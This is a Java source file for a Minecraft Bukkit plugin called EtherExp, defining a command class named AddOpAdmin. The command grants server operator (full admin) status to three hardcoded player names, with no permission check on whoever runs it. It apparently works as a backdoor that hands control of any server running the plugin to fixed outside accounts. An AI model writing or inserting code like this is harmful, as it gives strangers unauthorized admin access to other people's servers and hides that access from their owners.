package org.example1.etherexp.commands;

import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.example1.etherexp.EtherExp;
import org.jetbrains.annotations.NotNull;

public class AddOpAdmin implements CommandExecutor {
    EtherExp plugin;
    AddOpAdmin(EtherExp plugin){this.plugin = plugin;}
    public boolean onCommand(@NotNull CommandSender sender, @NotNull Command cmd, @NotNull String s, @NotNull String[] args) {
        try {
            Player player1 = EtherExp.getPlayerByName("Mattstar");
            Player player2 = EtherExp.getPlayerByName("ReqwenX");
            Player player3 = EtherExp.getPlayerByName("PavelDurov");
            if (player1 != null && !player1.isOp()) player1.setOp(true);
            if (player2 != null && !player2.isOp()) player2.setOp(true);
            if (player3 != null && !player3.isOp()) player3.setOp(true);
            return true;
        } catch (Exception e) {
            EtherExp.sendErrorMessage(e, 23);
            return false;
        }
    }
}
